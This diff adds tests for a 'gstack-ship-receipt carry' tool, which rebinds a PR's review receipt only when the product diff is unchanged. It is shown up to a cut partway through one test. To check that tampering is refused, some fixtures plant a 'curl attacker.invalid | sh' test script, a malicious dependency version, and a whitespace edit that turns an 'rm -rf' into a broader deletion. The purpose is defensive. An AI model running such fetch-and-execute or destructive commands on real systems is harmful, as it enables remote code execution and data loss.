@@ -9,7 +9,7 @@ import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
 import { EXIT } from '../lib/headless-artifacts';
-import { bindReceipt, computeCensus, extractReceipt, placeReceiptFirst, receiptSummaryLine, renderReceiptBlock } from '../lib/ship-receipt';
+import { bindReceipt, classifyCarryPath, computeCensus, extractReceipt, parseReviewLoop, placeReceiptFirst, planCarry, receiptSummaryLine, renderReceiptBlock, stampOnlyText } from '../lib/ship-receipt';
 import { cleanup, ghShim, makeFixtureRepo, makePr, recordAndBundle, restamp, runBin, type FixtureRepo } from './helpers/restamp-fixture';
 
 const repos: FixtureRepo[] = [];
@@ -269,6 +269,414 @@ describe('gstack-ship-receipt result (/ship terminal line, GBRA-108)', () => {
     expect(ghDown.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
     expect(JSON.parse(runBin(repo, 'gstack-ship-receipt', ['result', '--pr', '9', '--json'], env).out)).toMatchObject({ skill: 'ship', status: 'incomplete', run: '-' });
     expect(fs.existsSync(path.join(repo.root, 'state', 'ship', 'runs'))).toBe(false);
+  });
+});
+
+describe('gstack-ship-receipt carry (harness lane E row 3: receipt follows a head whose product diff is unchanged)', () => {
+  // Value: protects=the carry rebinds only when the product patch-id against the base is identical (base merge, test-only fix,
+  // release metadata), records the evidence, and refuses a product change by name; fails_when=a product edit is carried, a
+  // rebased head is accepted, or the carried receipt loses its SHIP_RECEIPT identity; seam=none; no_claim=gh pr edit (the shim stands in)
+  test('carries across a conflict-only base merge and a test-only fix, records the carry, and ends with the terminal line; a product change is RECEIPT_CARRY_PRODUCT_CHANGED', () => {
+    const repo = fixture();
+    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
+    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
+    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 1;\n');
+    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test a\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed app'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
+    repo.git('commit', '-qam', 'feat: a=2');
+    const reviewed = repo.git('rev-parse', 'HEAD');
+    // main moves on in another file; the branch merges it (conflict-only base merge).
+    repo.git('checkout', '-q', 'main');
+    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 2;\n');
+    repo.git('commit', '-qam', 'main: o=2'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-q', 'feat');
+    repo.git('merge', '-q', '--no-edit', 'origin/main');
+    // then a test-only fix
+    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test a=2\n');
+    repo.git('commit', '-qam', 'test: fix expectation');
+    const head = repo.git('rev-parse', 'HEAD');
+    const state = path.join(repo.root, 'state');
+    const body = path.join(repo.root, 'body.md');
+    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 5, head: reviewed, base: 'main', queue_mode: 'stamp-at-merge', review_loop: { passes: 2, blocking_found: 1, deferred: 1 } } as any));
+    const env = { GSTACK_STATE_ROOT: state, GSTACK_SESSION_KIND: 'unattended' };
+    const dry = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(dry.status).toBe(EXIT.ok);
+    expect(dry.out.trim()).toBe(`CARRY: would carry from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (base merge + test-only change); nothing written`);
+    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(reviewed);
+    const carried = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'carry-run')], env);
+    expect(carried.status).toBe(EXIT.ok);
+    expect(carried.out.trim().split('\n')).toEqual([
+      `CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (base merge + test-only change)`,
+      `GSTACK_RESULT: skill=ship status=complete run=${path.join(repo.root, 'carry-run')}`,
+    ]);
+    expect(carried.err.trim()).toBe(`SHIP_RECEIPT: pr=5 head=${head.slice(0, 12)} version=- base=main passes=2 blocking_found=1 deferred=1 carried_from=${reviewed.slice(0, 12)}`);
+    const after = extractReceipt(fs.readFileSync(body, 'utf8'));
+    expect(after.errors).toEqual([]);
+    expect(after.receipt).toMatchObject({ pr: 5, head, base: 'main', review_loop: { passes: 2 } });
+    expect(after.receipt!.carry).toMatchObject({ from: reviewed, reason: 'base merge + test-only change', merge_commits: 1, covers: ['pre-landing review', 'adversarial review', 'gate integrity', 'documentation audit'] });
+    expect(after.receipt!.carry!.product_patch_id).toMatch(/^[0-9a-f]{40}$/);
+    expect(after.receipt!.carry!.changed_paths.sort()).toEqual(['product:src/other.ts', 'test:test/app.test.ts']);
+    expect(after.receipt!.carry!.range_diff).not.toMatch(/^unavailable/);
+    expect(fs.readFileSync(body, 'utf8')).toContain('\n## Summary\n\nProse.\n');
+    const run = JSON.parse(fs.readFileSync(path.join(repo.root, 'carry-run', 'ship-run.json'), 'utf8'));
+    expect(run).toMatchObject({ skill: 'ship', status: 'complete', head, pr: 5, carried_from: reviewed, carry_reason: 'base merge + test-only change' });
+    expect(bindReceipt(fs.readFileSync(body, 'utf8'), '5', [head]).ok).toBe(true);
+    // already current
+    const current = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
+    expect([current.status, current.out.trim()]).toEqual([EXIT.ok, `CARRY: current (the receipt already names ${head.slice(0, 12)})`]);
+    // a product change does not carry, and the body keeps the receipt it had
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 3;\n');
+    repo.git('commit', '-qam', 'feat: a=3');
+    const changed = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
+    expect(changed.status).toBe(EXIT.refused);
+    expect(changed.out.trim()).toBe('CARRY: refused (RECEIPT_CARRY_PRODUCT_CHANGED)\nGSTACK_RESULT: skill=ship status=refused run=-');
+    expect(changed.err).toContain(`product diff changed between ${head.slice(0, 12)} and ${repo.git('rev-parse', 'HEAD').slice(0, 12)}: src/app.ts`);
+    expect(changed.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED; https://github.com/garrytan/gstack/blob/main/docs/troubleshooting.md#receipt-carry-product-changed)');
+    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(head);
+  });
+
+  test('a rebased head (receipt head not an ancestor), a body without a receipt and another PR\'s receipt are refused; through gh the body is posted with gh pr edit', () => {
+    const repo = fixture();
+    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'b\n');
+    repo.git('commit', '-qam', 'feat');
+    const reviewed = repo.git('rev-parse', 'HEAD');
+    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state') };
+    const foreign = path.join(repo.root, 'foreign.md');
+    fs.writeFileSync(foreign, placeReceiptFirst('x\n', { schema_version: 1, pr: 5, head: 'c'.repeat(40), base: 'main' } as any));
+    repo.git('commit', '-q', '--allow-empty', '-m', 'empty follow-up');
+    const notAncestor = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', foreign], env);
+    expect(notAncestor.status).toBe(EXIT.refused);
+    expect(notAncestor.err).toContain('is not an ancestor of HEAD');
+    expect(notAncestor.err).toContain('(RECEIPT_CARRY_REFUSED;');
+    const none = path.join(repo.root, 'none.md');
+    fs.writeFileSync(none, 'No receipt.\n');
+    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--body', none], env).err).toContain('(QUEUE_RECEIPT_MISSING;');
+    expect(runBin(repo, 'gstack-ship-receipt', ['carry'], env).status).toBe(EXIT.usage);
+    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '5', '--body', none], env).status).toBe(EXIT.usage);
+    // through gh: the shim records the edit
+    const head = repo.git('rev-parse', 'HEAD');
+    const shimDir = path.join(repo.root, 'gh2');
+    fs.mkdirSync(shimDir);
+    const posted = path.join(shimDir, 'posted.md');
+    const prBody = placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 8, head: reviewed, base: 'main' } as any);
+    fs.writeFileSync(path.join(shimDir, 'pr.json'), JSON.stringify({ body: prBody, headRefOid: head }));
+    fs.writeFileSync(path.join(shimDir, 'gh'), [
+      '#!/bin/sh',
+      `if [ "$1" = pr ] && [ "$2" = view ]; then cat "${path.join(shimDir, 'pr.json')}"; exit 0; fi`,
+      `if [ "$1" = pr ] && [ "$2" = edit ]; then shift 3; [ "$1" = --body-file ] || exit 9; cp "$2" "${posted}"; exit 0; fi`,
+      'echo "unsupported $*" >&2; exit 1', '',
+    ].join('\n'), { mode: 0o755 });
+    const viaGh = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', path.join(repo.root, 'run')], { ...env, PATH: `${shimDir}:${process.env.PATH}` });
+    expect(viaGh.status).toBe(EXIT.ok);
+    expect(viaGh.out).toContain(`CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (no content change)`);
+    const postedReceipt = extractReceipt(fs.readFileSync(posted, 'utf8'));
+    expect(postedReceipt.receipt).toMatchObject({ pr: 8, head, carry: { from: reviewed, reason: 'no content change', merge_commits: 0 } });
+    expect(fs.readFileSync(posted, 'utf8')).toContain('## Summary\n\nProse.\n');
+    const other = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '9'], { ...env, PATH: `${shimDir}:${process.env.PATH}` });
+    expect(other.status).toBe(EXIT.refused);
+    expect(other.err).toContain('the receipt names pr=8, not this PR');
+  });
+
+  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
+  // Value: protects=a release-metadata-only change (VERSION, CHANGELOG, lockfile, the policy's stamp_paths and release_outputs)
+  // carries with reason "release metadata" and every path classed metadata, so a stamp never sends a Captain back through a full
+  // /ship; fails_when=the metadata globs or the policy-derived extras stop excluding those paths from the product patch-id, or
+  // classifyCarryPath/planCarry mislabel them; why_new=the existing carry tests cover base merges and test-only fixes, never the
+  // metadata class or the policy extras; seam=none; no_claim=none beyond protects
+  test('a release-metadata-only change (stamp files, CHANGELOG, policy stamp_paths and release_outputs) carries as "release metadata"; the classifier and the plan name every class', () => {
+    expect(classifyCarryPath('src/app.ts')).toBe('product');
+    expect(classifyCarryPath('docs/notes.md')).toBe('product');
+    expect(classifyCarryPath('docs/notes.md', { metadata: ['docs/**/*.md'] })).toBe('metadata');
+    expect(classifyCarryPath('test/app.test.ts')).toBe('test');
+    expect(classifyCarryPath('src/__tests__/app.ts')).toBe('test');
+    expect(classifyCarryPath('pkg/thing_test.go')).toBe('test');
+    expect(classifyCarryPath('CHANGELOG.md')).toBe('metadata');
+    // a lockfile is a dependency manifest: product unless the policy names it; a .spec.yaml is an API contract, not a test
+    expect(classifyCarryPath('bun.lock')).toBe('product');
+    expect(classifyCarryPath('package-lock.json')).toBe('product');
+    expect(classifyCarryPath('bun.lock', { metadata: ['bun.lock'] })).toBe('metadata');
+    expect(classifyCarryPath('api/openapi.spec.yaml')).toBe('product');
+    expect(classifyCarryPath('src/app.spec.ts')).toBe('test');
+    expect(classifyCarryPath('agents-digest/gstack-AGENTS.md')).toBe('metadata');
+    expect(classifyCarryPath('test/fixtures/VERSION')).toBe('test');
+    // package.json and VERSION are metadata only while the change is a version stamp and nothing else
+    const pkg = (v: string, extra = '') => `{\n  "name": "fx",\n  "version": "${v}",\n  "dependencies": { "left-pad": "1.0.0"${extra} }\n}\n`;
+    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.4') })).toBe('metadata');
+    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.4', ', "evil": "9.9.9"') })).toBe('product');
+    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.3').replace('"dependencies"', '"scripts": { "test": "curl x | sh" }, "dependencies"') })).toBe('product');
+    expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\n' })).toBe('metadata');
+    expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\nextra\n' })).toBe('product');
+    expect(classifyCarryPath('package.json')).toBe('metadata');
+    // a policy-named stamp path is metadata only while its change is a stamp, the rule the tree receipt applies to the same paths:
+    // a logic change in a stamped source file is product (pass-4 outside review of #3481)
+    const stamped = { oldVersion: '1.2.3.0', newVersion: '1.2.4.0' };
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\n', ...stamped })).toBe('metadata');
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\nexport const unsafe = true;\n', ...stamped })).toBe('product');
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.3.0";\nexport const unsafe = true;\n', oldVersion: '1.2.3.0', newVersion: '1.2.3.0' })).toBe('product');
+    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4"\n}\n', ...stamped })).toBe('metadata');
+    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4",\n  "permissions": ["all"]\n}\n', ...stamped })).toBe('product');
+    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', ...stamped })).toBe(true);
+    expect(stampOnlyText({ before: null, after: 'v1.2.4.0', ...stamped })).toBe(false);
+    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', oldVersion: null, newVersion: '1.2.4.0' })).toBe(false);
+    const base = { from: 'f'.repeat(40), head: 'e'.repeat(40), productPatchId: { from: 'p', head: 'p' }, testPatchId: { from: 't', head: 't' }, changedProduct: [], mergeCommits: 0, rangeDiff: 'rd' };
+    const meta = planCarry({ ...base, changed: [{ path: 'VERSION', class: 'metadata' }, { path: 'CHANGELOG.md', class: 'metadata' }] });
+    expect(meta.ok && meta.carry.reason).toBe('release metadata');
+    expect(meta.ok && meta.carry.changed_paths).toEqual(['metadata:VERSION', 'metadata:CHANGELOG.md']);
+    const merges = planCarry({ ...base, mergeCommits: 2, changed: [{ path: 'src/other.ts', class: 'product' }] });
+    expect(merges.ok && merges.carry.reason).toBe('2 base merges');
+    const reverted = planCarry({ ...base, changed: [{ path: 'src/other.ts', class: 'product' }] });
+    expect(reverted.ok && reverted.carry.reason).toBe('no product change');
+    const empty = planCarry({ ...base, changed: [] });
+    expect(empty.ok && [empty.carry.reason, empty.carry.product_patch_id]).toEqual(['no content change', 'p']);
+    expect(planCarry({ ...base, productPatchId: { from: '', head: '' }, changed: [] }).ok && (planCarry({ ...base, productPatchId: { from: '', head: '' }, changed: [] }) as any).carry.product_patch_id).toBe('none');
+    const changed = planCarry({ ...base, productPatchId: { from: 'p', head: 'q' }, mergeCommits: 1, changed: [], changedProduct: Array.from({ length: 22 }, (_, i) => `src/f${i}.ts`) });
+    expect(changed.ok).toBe(false);
+    expect(!changed.ok && changed.code).toBe('RECEIPT_CARRY_PRODUCT_CHANGED');
+    expect(!changed.ok && changed.message).toContain('src/f0.ts, src/f1.ts');
+    expect(!changed.ok && changed.message).toContain('src/f19.ts (+2 more)');
+    expect(!changed.ok && changed.message).not.toContain('src/f20.ts');
+
+    const repo = fixture();
+    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed app'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
+    repo.git('commit', '-qam', 'feat: a=2');
+    const reviewed = repo.git('rev-parse', 'HEAD');
+    // the stamp: VERSION, package.json (version only), the CHANGELOG, a stamp_paths doc and a release_outputs file
+    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.4.0\n');
+    fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"version": "1.2.3"', '"version": "1.2.4"'));
+    fs.writeFileSync(path.join(repo.work, 'CHANGELOG.md'), fs.readFileSync(path.join(repo.work, 'CHANGELOG.md'), 'utf8').replace('# Changelog\n', '# Changelog\n\n## [1.2.4.0] - 2026-10-26\n\n- a=2\n'));
+    fs.writeFileSync(path.join(repo.work, 'docs', 'notes.md'), fs.readFileSync(path.join(repo.work, 'docs', 'notes.md'), 'utf8').replace('v1.2.3.0', 'v1.2.4.0'));
+    fs.writeFileSync(path.join(repo.work, 'generated', 'digest.md'), '# digest v1.2.4.0\nbody\n');
+    repo.git('commit', '-qam', 'stamp 1.2.4.0');
+    const head = repo.git('rev-parse', 'HEAD');
+    const body = path.join(repo.root, 'body.md');
+    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: reviewed, base: 'main', version: '1.2.3.0' } as any));
+    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
+    const carried = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'carry-run'), '--json'], env);
+    expect(carried.status).toBe(EXIT.ok);
+    expect(carried.out).toContain(`CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (release metadata)`);
+    const after = extractReceipt(fs.readFileSync(body, 'utf8'));
+    expect(after.errors).toEqual([]);
+    expect(after.receipt).toMatchObject({ pr: 6, head, carry: { from: reviewed, reason: 'release metadata', merge_commits: 0 } });
+    expect(after.receipt!.carry!.changed_paths.sort()).toEqual([
+      'metadata:CHANGELOG.md', 'metadata:VERSION', 'metadata:docs/notes.md', 'metadata:generated/digest.md', 'metadata:package.json']);
+    expect(after.receipt!.carry!.product_patch_id).toMatch(/^[0-9a-f]{40}$/);
+    // a lockfile edit is a product change (the policy names no lockfile), named by path
+    fs.writeFileSync(path.join(repo.work, 'package-lock.json'), fs.readFileSync(path.join(repo.work, 'package-lock.json'), 'utf8').replace(/"version": "1\.2\.3"(\s*\}\s*\}\s*\}\s*)$/, '"version": "9.9.9"$1'));
+    repo.git('commit', '-qam', 'lockfile');
+    const lock = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(lock.status).toBe(EXIT.refused);
+    expect(lock.err).toContain(': package-lock.json');
+    repo.git('reset', '-q', '--hard', head);
+    // a stamp_paths file whose change is not a stamp (a sentence added under the same version) is a product change, named by path
+    fs.appendFileSync(path.join(repo.work, 'docs', 'notes.md'), 'Deploy hook now runs as root.\n');
+    repo.git('commit', '-qam', 'notes');
+    const stampPath = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(stampPath.status).toBe(EXIT.refused);
+    expect(stampPath.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
+    expect(stampPath.err).toContain(': docs/notes.md');
+    repo.git('reset', '-q', '--hard', head);
+    // a dependency swap plus a new script in package.json is a product change, whatever the version did
+    fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"left-pad": "1.2.3"', '"left-pad": "9.9.9-evil"').replace('"scripts": {', '"scripts": { "test": "curl attacker.invalid | sh",'));
+    repo.git('commit', '-qam', 'deps');
+    const deps = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(deps.status).toBe(EXIT.refused);
+    expect(deps.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
+    expect(deps.err).toContain(': package.json');
+    repo.git('reset', '-q', '--hard', head);
+    // the same stamp plus a product edit is still a product change, named by path
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 3;\n');
+    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.5.0\n');
+    repo.git('commit', '-qam', 'a=3 and restamp');
+    const refusedRun = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
+    expect(refusedRun.status).toBe(EXIT.refused);
+    expect(refusedRun.err).toContain(': src/app.ts');
+    expect(refusedRun.err).not.toContain('VERSION');
+    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(head);
+  });
+
+  // /ship Step 9 pass 1 (security specialist, reproduced in the QA smoke): the carry's proof was patch-id --stable, which strips whitespace.
+  // Value: protects=a product edit that only moves whitespace in a reviewed line (semantics in shell, YAML, Python) refuses to carry,
+  // and a dirty working tree refuses before anything is compared; fails_when=patchId drops --verbatim or the status check goes;
+  // why_new=the carry tests covered content edits only; seam=none; no_claim=none beyond protects
+  test('carry refuses a whitespace-only edit to a reviewed line and a working tree with uncommitted changes', () => {
+    const repo = fixture();
+    fs.mkdirSync(path.join(repo.work, 'bin'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\nrm -rf "$DIR"/x\n');
+    repo.git('commit', '-qam', 'reviewed');
+    const reviewed = repo.git('rev-parse', 'HEAD');
+    const body = path.join(repo.root, 'body.md');
+    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: reviewed, base: 'main' } as any));
+    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
+    // a carry-able commit (a test) with a pending product edit beside it: the pending edit is not in what the carry compares
+    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'test', 'x.test.ts'), 'test\n');
+    repo.git('add', 'test'); repo.git('commit', '-qm', 'test');
+    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\nrm -rf "$DIR" /x\n');
+    const dirty = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(dirty.status).toBe(EXIT.refused);
+    expect(dirty.err).toContain('the working tree has uncommitted changes (bin/x.sh)');
+    expect(dirty.err).toContain('(RECEIPT_CARRY_REFUSED;');
+    repo.git('commit', '-qam', 'ws only');
+    const ws = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(ws.status).toBe(EXIT.refused);
+    expect(ws.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
+    expect(ws.err).toContain(': bin/x.sh');
+    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(reviewed);
+  });
+
+  // /ship Step 9 pass 1 (testing specialist): a receipt carried twice named the carried head as its origin.
+  // Value: protects=a receipt carried A→B then B→C still names the reviewed head A, adds up the hops' merges and paths, and the
+  // run record's carried_from is A; fails_when=carryReceipt spreads the new carry over the old one; why_new=only single carries
+  // were tested; seam=none; no_claim=none beyond protects
+  test('a receipt carried twice keeps the reviewed head as carry.from and accumulates the hops', () => {
+    const repo = fixture();
+    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
+    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 1;\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
+    repo.git('commit', '-qam', 'feat');
+    const a = repo.git('rev-parse', 'HEAD');
+    // main moves on an unrelated file; feat merges it (hop 1), then a test lands (hop 2)
+    repo.git('checkout', '-q', 'main');
+    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 2;\n');
+    repo.git('commit', '-qam', 'main: other'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-q', 'feat'); repo.git('merge', '-q', '--no-edit', 'main');
+    const b = repo.git('rev-parse', 'HEAD');
+    const body = path.join(repo.root, 'body.md');
+    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: a, base: 'main' } as any));
+    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
+    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env).status).toBe(EXIT.ok);
+    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
+    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'test');
+    const c = repo.git('rev-parse', 'HEAD');
+    const second = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'run2'), '--json'], env);
+    expect(second.status).toBe(EXIT.ok);
+    expect(second.out).toContain(`CARRY: carried from ${b.slice(0, 12)} to ${c.slice(0, 12)} (test-only change)`);
+    const receipt = extractReceipt(fs.readFileSync(body, 'utf8')).receipt!;
+    expect(receipt.head).toBe(c);
+    expect(receipt.carry).toMatchObject({ from: a, reason: 'base merge + test-only change', merge_commits: 1 });
+    expect(receipt.carry!.changed_paths).toEqual(['product:src/other.ts', 'test:test/app.test.ts']);
+    expect(receiptSummaryLine(receipt)).toContain(`carried_from=${a.slice(0, 12)}`);
+    const run = JSON.parse(fs.readFileSync(path.join(repo.root, 'run2', 'ship-run.json'), 'utf8'));
+    expect(run.carried_from).toBe(a);
+  });
+
+  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
+  // Value: protects=carry through gh never rebinds a receipt to a head GitHub has not seen (HEAD ahead of the pushed head is
+  // refused with "push first"), and a failed gh pr edit or gh pr view reports status=incomplete with the body left as it was,
+  // never status=complete; fails_when=the headRefOid check is dropped, or the gh failure path returns the terminal complete line
+  // or writes a run record; why_new=the existing gh carry test covers the happy post only; seam=none; no_claim=gh itself (a shim
+  // stands in for pr view and pr edit)
+  test('carry --pr refuses a HEAD that is not the pushed head, and a failing gh pr edit or pr view is incomplete with nothing carried', () => {
+    const repo = fixture();
+    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
+    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
+    repo.git('checkout', '-qb', 'feat');
+    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'b\n');
+    repo.git('commit', '-qam', 'feat');
+    const reviewed = repo.git('rev-parse', 'HEAD');
+    repo.git('commit', '-q', '--allow-empty', '-m', 'empty follow-up');
+    const head = repo.git('rev-parse', 'HEAD');
+    const shimDir = path.join(repo.root, 'gh3');
+    fs.mkdirSync(shimDir);
+    const posted = path.join(shimDir, 'posted.md');
+    const prJson = path.join(shimDir, 'pr.json');
+    const editRc = path.join(shimDir, 'edit-rc');
+    const prBody = placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 8, head: reviewed, base: 'main' } as any);
+    fs.writeFileSync(path.join(shimDir, 'gh'), [
+      '#!/bin/sh',
+      `if [ "$1" = pr ] && [ "$2" = view ]; then [ -f "${prJson}" ] || { echo "gh: HTTP 502" >&2; exit 1; }; cat "${prJson}"; exit 0; fi`,
+      `if [ "$1" = pr ] && [ "$2" = edit ]; then shift 3; [ "$1" = --body-file ] || exit 9; cp "$2" "${posted}"; rc=$(cat "${editRc}" 2>/dev/null || echo 0); [ "$rc" = 0 ] || echo "gh: validation failed" >&2; exit "$rc"; fi`,
+      'echo "unsupported $*" >&2; exit 1', '',
+    ].join('\n'), { mode: 0o755 });
+    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), PATH: `${shimDir}:${process.env.PATH}` };
+    const runDir = path.join(repo.root, 'run');
+    // GitHub still has the reviewed head: the follow-up was never pushed
+    fs.writeFileSync(prJson, JSON.stringify({ body: prBody, headRefOid: reviewed }));
+    const unpushed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
+    expect(unpushed.status).toBe(EXIT.refused);
+    expect(unpushed.err).toContain(`HEAD ${head.slice(0, 12)} is not PR #8's pushed head ${reviewed.slice(0, 12)}; push first, then carry`);
+    expect(unpushed.err).toContain('(RECEIPT_CARRY_REFUSED;');
+    expect(unpushed.out.trim()).toBe('CARRY: refused (RECEIPT_CARRY_REFUSED)\nGSTACK_RESULT: skill=ship status=refused run=-');
+    expect(fs.existsSync(posted)).toBe(false);
+    // pushed, but the edit fails: incomplete, no run record, nothing carried
+    fs.writeFileSync(prJson, JSON.stringify({ body: prBody, headRefOid: head }));
+    fs.writeFileSync(editRc, '1\n');
+    const editFailed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
+    expect(editFailed.status).toBe(EXIT.fail);
+    expect(editFailed.err).toContain('gh pr edit failed: gh: validation failed; the receipt was not carried');
